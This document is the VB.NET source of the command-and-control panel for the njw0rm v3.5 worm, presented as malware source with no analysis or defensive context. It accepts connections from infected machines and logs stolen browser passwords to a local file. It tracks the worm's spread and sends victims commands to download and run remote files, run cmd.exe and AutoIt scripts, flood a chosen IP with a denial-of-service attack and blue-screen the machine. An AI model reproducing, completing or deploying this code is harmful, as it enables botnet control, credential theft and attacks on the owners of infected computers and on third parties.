Imports System.Threading
Imports System.Net.Sockets
Imports System.Text

Public Class Form1
    Sub New()
        Console.Title = "Logs"
        ' This call is required by the Windows Form Designer.
        InitializeComponent()
        ' Add any initialization after the InitializeComponent() call.
    End Sub
    Public VR As String = "njw0rm v3.5 Online[ x ] CON[ t ] Spread[ u ] Sel[ y ]"
    Public db As New njdb(Application.StartupPath & "\passwords.xml")
    Public Enum ET
        Connected = 0
        Disconnected = 1
        Message = 2
    End Enum
    Public msg As New List(Of Object())
    Public Function LOG(ByVal ParamArray S As TX())
        SyncLock Me
            Console.ForegroundColor = ConsoleColor.DarkGray
            Console.Write(HM())
            For Each x In S
                Console.ForegroundColor = x.C
                Console.Write(" " & x.T)
            Next
            Console.Write(vbNewLine)
        End SyncLock
    End Function
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Public S As SK
    Public port As Integer
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            db.AddColumn("a", True)
        Catch ex As Exception
        End Try
        F = Me
        Console.WindowWidth += Console.WindowWidth / 2
        Console.SetWindowSize(30, 5)
        For Each x As ToolStripItem In ContextMenuStrip1.Items
            x.ForeColor = Color.IndianRed
            x.BackColor = Color.Black
        Next
        Me.Text = "Nj-Worm v3.5"
        Control.CheckForIllegalCrossThreadCalls = False
        Me.Left = 0
        Me.Top = 0
        Me.Show()
        port = GTV("port", port)
        If port = 0 Then port = 1888
        Me.WindowState = FormWindowState.Minimized : Me.WindowState = FormWindowState.Normal
re:
        Try
            Dim k As String = InputBox("Set Port", "Port", port)
            If k = "" Then Close()
            S = New SK(k)
            port = k
            STV("port", port)
        Catch ex As Exception
            LOG(New TX("ERR", ConsoleColor.Red), New TX(ex.Message, ConsoleColor.Cyan))
            GoTo re
        End Try
        Timer1.Enabled = True
    End Sub
    Function per(ByVal n1 As Integer, ByVal n2 As Integer) As String
        If n2 = 0 Then
            Return "%0"
        End If
        Return (Double.Parse(n1) / Double.Parse(n2) * 100 / 100.0).ToString("%0.0").Replace(".0", "")
    End Function
    Function RN(ByVal c As Integer) As String
        Randomize()
        Dim r As New Random
        Dim s As String = ""
        Dim k As String = "abcdefghijklmnopqrstuvwxyz"
        For i As Integer = 1 To c
            s += k(r.Next(0, k.Length))
        Next
        Return s
    End Function
    Public Y As String = "0njxq80" ' split W0rD
    Public spread As New List(Of String)
    Delegate Sub _req(ByVal c As USER, ByVal a As String())
    Sub req(ByVal c As USER, ByVal A As String())
        Try
            Select Case A(0)
                Case "lv"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _req(AddressOf req), c, A)
                        Exit Sub
                    End If

                    Dim ll As New List(Of String)
                    ll.Add(A(1))
                    ll.Add(c.IP.Split(":")(0))
                    For i As Integer = 2 To A.Length - 1
                        ll.Add(A(i))
                    Next

                    SyncLock Me.Lv1
                        c.L = Lv1.Items.Add(New ListViewItem(ll.ToArray))

                    End SyncLock
                    c.L.Tag = c

                    If ll(5) = "Y" Then
                        SyncLock spread
                            If spread.Contains(c.IP) = False Then
                                spread.Add(c.IP)
                            End If
                        End SyncLock
                    End If
                    ll.Clear()
                    LOG(New TX() {New TX(c.IP, ConsoleColor.Green), New TX(VNO(c.L), ConsoleColor.Magenta)})
                Case "ac"
                    c.L.SubItems(c.L.SubItems.Count - 1).Text = A(1)
                Case "dis"
                    LOG(New TX() {New TX(c.IP, ConsoleColor.Red), New TX(VNO(c.L), ConsoleColor.Red)})
                    If c.L IsNot Nothing Then c.L.Remove()
                    SyncLock spread
                        spread.Remove(c.IP)
                    End SyncLock
                Case "MSG"
                    LOG(New TX() {New TX(c.IP, ConsoleColor.Green), New TX(A(1), ConsoleColor.White)})
                Case "pas"
                    Dim url As String = ""
                    Dim usr As String = ""
                    Dim pwd As String = ""
                    For i As Integer = 1 To A.Length - 1
                        Dim x As String = A(i)
                        Select Case Split(x, ": ")(0)
                            Case "URL"
                                url = x.Replace("URL: ", "")
                                usr = ""
                                pwd = ""
                            Case "USR"
                                usr = x.Replace("USR: ", "")
                            Case "pas"
                                If x.Contains("PWD: /base64") Then
                                    pwd = BS(Convert.FromBase64String(x.Replace("PWD: /base64", "")))
                                Else
                                    pwd = x.Replace("PWD: ", "")
                                End If
                                If usr = "" And pwd.Replace(ChrW(0), "") = "" Then
                                Else
                                    db.AddItem(ENB(url) & "_" & ENB(usr) & "_" & ENB(pwd))
                                End If

                        End Select
                    Next

                    SyncLock F
                        If Application.OpenForms("pwd") IsNot Nothing Then
                            Try
                                CType(Application.OpenForms("pwd"), pwd).Ref()
                            Catch ex As Exception
                            End Try
                        End If
                    End SyncLock

            End Select
        Catch ex As Exception
            LOG(New TX() {New TX("Listner", ConsoleColor.White), New TX("ERR AT " & A(0), ConsoleColor.White), New TX(ex.Message.Replace(vbNewLine, "|"), ConsoleColor.Red)})
        End Try
    End Sub

    Public Function VNO(ByVal l As ListViewItem) As String
        If l Is Nothing Then Return ""
        Try
            Return l.SubItems(0).Text & " " & l.SubItems(2).Text & " " & l.SubItems(3).Text & " " & l.SubItems(4).Text
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Private Sub Lv1_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Lv1.KeyDown
        Select Case e.KeyCode
            Case Keys.Space
                Lv1.FX()
            Case Keys.A
                If e.Control Then
                    For Each x As ListViewItem In Lv1.Items
                        x.Selected = True
                    Next
                End If
        End Select
    End Sub
    Private Sub RunFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunFileToolStripMenuItem.Click
        If Lv1.SelectedItems.Count = 0 Then Exit Sub
        Dim o As New FURL
        o.ShowDialog(Me)
        If o.IsOK Then
            For Each x In Lv1.SelectedItems
                Dim c As USER = x.tag
                c.Send("dl" & Y & o.TextBox1.Text & Y & RN(10) & "." & o.TextBox2.Text)
            Next
        End If
    End Sub
    Private Sub UninstallToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        For Each x In Lv1.SelectedItems
            Dim c As USER = x.tag
            c.Send("un")
        Next
    End Sub
    Private Sub UpdateToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UpdateToolStripMenuItem.Click
        If Lv1.SelectedItems.Count = 0 Then Exit Sub
        Dim k As String = InputBox("Enter URL", "Update", "")
        If k.Length > 0 Then
            For Each x In Lv1.SelectedItems
                Dim c As USER = x.tag
                c.Send("up" & Y & k & Y & RN(10) & ".exe")
            Next
        End If
    End Sub
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Timer1.Enabled = False
        Me.Text = VR.Replace("x", Lv1.Items.Count).Replace("y", Lv1.SelectedItems.Count).Replace("t", S.Online.Count).Replace("u", per(spread.Count, Lv1.Items.Count))
        Timer1.Enabled = True
    End Sub
    Private Sub ScriptToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ScriptToolStripMenuItem.Click
        If Lv1.SelectedItems.Count = 0 Then Exit Sub
        Dim f As New Form
        Dim T As New TextBox With {.Dock = DockStyle.Fill, .ScrollBars = ScrollBars.Both, .Multiline = True, .Name = "T"}
        Dim b As New Button With {.Text = "Execute", .Dock = DockStyle.Bottom}
        Dim bb As New Button With {.Text = "Cancel", .Dock = DockStyle.Bottom}
        f.Controls.AddRange(New Control() {T, b, bb})
        f.Tag = ""
        f.Icon = Me.Icon
        AddHandler b.Click, AddressOf Bhand
        AddHandler bb.Click, AddressOf Bhand
        f.Text = "Autoit Script"
        f.ShowDialog(Me)
        If f.Tag <> "" Then
            For Each x In Lv1.SelectedItems
                Dim c As USER = x.tag
                c.Send("ex" & Y & f.Tag)
            Next
        End If
    End Sub
    Sub Bhand(ByVal sender As Button, ByVal e As System.EventArgs)
        If sender.Text = "Execute" Then
            sender.Parent.Tag = sender.Parent.Controls("T").Text
        Else
            sender.Parent.Tag = ""
        End If
        sender.Parent.Dispose()
    End Sub
    Private Sub CMDEXEToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CMDEXEToolStripMenuItem.Click
        If Lv1.SelectedItems.Count = 0 Then Exit Sub
        Dim k As String = InputBox("Execute cmd.exe" & vbNewLine & "/c start www.google.com, or,/c del %temp%\*.vbs", "Script", "/c ")
        If k.Length > 0 Then
            For Each x In Lv1.SelectedItems
                Dim c As USER = x.tag
                c.Send("cmd" & Y & k)
            Next
        End If
    End Sub
    Private Sub AboutToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AboutToolStripMenuItem.Click
        Dim o As New About
        o.ShowDialog(Me)
    End Sub
    Private Sub BuilderToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BuilderToolStripMenuItem.Click
        Dim f As New Form2
        f.ShowDialog(Me)
    End Sub

    Private Sub GetPasswordsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetPasswordsToolStripMenuItem.Click
        For Each x In Lv1.SelectedItems
            Dim c As USER = x.tag
            c.Send("pwd")
        Next
        SyncLock F
            If Application.OpenForms("pwd") Is Nothing Then
                Dim o As New pwd
                o.Show()
            End If
        End SyncLock

    End Sub

    Private Sub OpenWebPageToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenWebPageToolStripMenuItem.Click
        Try
            Dim u As String = InputBox("Enter URL")
            For Each x In Lv1.SelectedItems
                Dim c As USER = x.tag
                c.Send("url" & Y & u)
            Next
        Catch ex As Exception

        End Try

    End Sub

    Private Sub DosAttackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DosAttackToolStripMenuItem.Click
        Try
            Dim u As String = InputBox("Enter IP")
            Dim ipp As String = InputBox("Enter Dos Attack Numbar = 5000 or 25000 or 65000")
            For Each x In Lv1.SelectedItems
                Dim c As USER = x.tag
                c.Send("att" & Y & u & Y & ipp)
            Next
        Catch ex As Exception

        End Try
    End Sub

    Private Sub MsgboxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MsgboxToolStripMenuItem.Click
        Try
            Dim t As String = InputBox("Enter Title")
            Dim ms As String = InputBox("Enter Msgbox Text")
            For Each x In Lv1.SelectedItems
                Dim c As USER = x.tag
                c.Send("msg" & Y & t & Y & ms)
            Next
        Catch ex As Exception

        End Try
    End Sub
Public Class USER
    Public WithEvents T As System.Windows.Forms.Timer
    Public C As Net.Sockets.TcpClient
    Public L As ListViewItem
    Public B(300) As Byte
    Public MEM As New IO.MemoryStream
    Public IP As String
    Public BZ As Boolean = False
    Public CN As Boolean = True
    Public snd As New List(Of String)
    Sub New(ByVal c As Net.Sockets.TcpClient)
        Me.C = c
        F.Invoke(New _inv(AddressOf inv))
    End Sub
    Delegate Sub _inv()
    Sub inv()
        T = New System.Windows.Forms.Timer With {.Interval = 8000, .Enabled = True}
    End Sub
    Public Sub Send(ByVal s As String)
        Try
            Dim bf As Byte() = SB(s & vbNewLine)
            C.Client.Send(bf, 0, bf.Length, Net.Sockets.SocketFlags.None)
        Catch ex As Exception
            CN = False
            Try
                C.Client.Disconnect(False)
            Catch e As Exception
            End Try
        End Try
    End Sub
    Dim bo As Integer = 0
    Private Sub T_Tick(ByVal sender As Object, ByVal e As System.EventArgs) Handles T.Tick
        T.Enabled = False
        If bo = 3 Then
            If L Is Nothing Then
                CN = False
            Else
                SyncLock snd
                    snd.Add("p")
                End SyncLock
            End If
        Else
            SyncLock snd
                snd.Add("p")
            End SyncLock
            bo += 1
        End If
        If CN = False Then Exit Sub
        T.Enabled = True
    End Sub
End Class
Public Class SK
    Public S As Net.Sockets.TcpListener
    Sub New(ByVal port As Integer)
        S = New Net.Sockets.TcpListener(port)
        S.Server.SendTimeout = -1
        S.Server.ReceiveTimeout = -1
        S.Start(9999)
        Dim t As New Threading.Thread(AddressOf WL, 1)
        t.Start()
    End Sub
    Public Online As New Collection
    Private OFF As Boolean = False
    Public Disconnect As New List(Of USER)
    Sub pnd()
        While True
            Try
                Dim c As New USER(S.AcceptTcpClient)
                c.IP = c.C.Client.RemoteEndPoint.ToString
                c.C.ReceiveTimeout = -1
                c.C.SendTimeout = -1
                SyncLock Online
                    Online.Add(c, c.IP)
                End SyncLock
                F.LOG(New TX() {New TX(c.IP, ConsoleColor.Green), New TX("New Connection", ConsoleColor.White)})
                Thread.CurrentThread.Sleep(1)
            Catch ex As Exception
            End Try
        End While
    End Sub
    Private Sub WL()
        Dim t As Thread
        Dim idx As Integer = 0
        Dim lp As Integer = 0
        Dim c As USER
        For i As Integer = 0 To IT.Length - 1
            t = New Thread(AddressOf READ, 0) With {.Priority = ThreadPriority.Lowest}
            t.Start(i)
        Next
        t = New Thread(AddressOf pnd)
        t.Start()
re:
        SyncLock Online
            SyncLock Disconnect
                For i As Integer = 0 To 0
                    Try
                        If Disconnect.Count > 0 Then
                            c = Disconnect(0)
                            Disconnect.RemoveAt(0)
                            c.CN = False
                            Try
                                c.C.Client.Disconnect(False)
                            Catch ex As Exception
                            End Try
                            Try
                                c.C.Close()
                            Catch ex As Exception
                            End Try
                            Try
                                c.MEM.Dispose()
                            Catch ex As Exception

                            End Try
                            Try
                                c.T.Dispose()
                            Catch ex As Exception

                            End Try
                            Online.Remove(c.IP.ToString)
                            F.req(c, New String() {"dis"})

                        End If
                    Catch ex As Exception
                    End Try
                Next
                For i As Integer = 0 To IT.Length - 1
                    If IT(i) Is Nothing Then
                        If Online.Count > 0 Then
                            idx += 1
                            If idx > Online.Count Then idx = 1
                            c = Online(idx)
                            If c.BZ = False Then
                                c.BZ = True
                                IT(i) = c
                            End If
                        Else
                            Exit For
                        End If
                    End If
                Next
            End SyncLock
        End SyncLock
        Thread.CurrentThread.Sleep(1)
        GoTo re
    End Sub
    Private IT(30) As USER
    Public SPL As String = vbNewLine
    Private Sub READ(ByVal id As Integer)
re:
        Do Until IT(id) IsNot Nothing
            Thread.CurrentThread.Sleep(1)
        Loop
        Dim Q As Integer = 0
        Dim c As USER = IT(id)
        If OFF = True Then GoTo dis
        Q = 11
        If c.CN = False Then GoTo dis
        Try
            Q = 1
            If c.C.Connected = False Then GoTo dis
            SyncLock c.snd
ree:
                If c.snd.Count > 0 Then
                    c.Send(c.snd(0))
                    c.snd.RemoveAt(0)
                    GoTo ree
                End If
            End SyncLock
            If c.CN = False Then GoTo dis
            If c.C.Available > 0 Then
                Dim b(c.C.Available - 1) As Byte
                c.C.Client.Receive(b, 0, b.Length, SocketFlags.None)
                c.MEM.Write(b, 0, b.Length)
rr:
                If BS(c.MEM.ToArray).Contains(SPL) Then
                    Dim A As Array = fx(c.MEM.ToArray)
                    F.req(c, Split(BS(A(0)), F.Y))
                    c.MEM.Dispose()
                    c.MEM = New IO.MemoryStream
                    If A.Length = 2 Then
                        c.MEM.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            Q = 5
            GoTo dis
        End Try
e:
        c.BZ = False
        IT(id) = Nothing
        GoTo re
dis:
        c.T.Enabled = False
        c.T.Dispose()
        c.CN = False
        SyncLock Disconnect
            Disconnect.Add(c)
        End SyncLock
        IT(id) = Nothing
        GoTo re
    End Sub
    Function fx(ByVal b As Byte()) As Array
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), SPL)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + SPL.Length, b.Length - (T(0).Length + SPL.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
End Class
Public Class TX
    Sub New(ByVal t As String, ByVal c As ConsoleColor)
        Me.T = t
        Me.C = c
    End Sub
    Public T As String
    Public C As ConsoleColor
    End Class

    Private Sub ScreenBlueToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScreenBlueToolStripMenuItem.Click
        For Each x In Lv1.SelectedItems
            Dim c As USER = x.tag
            c.Send("scb")
        Next
    End Sub
End Class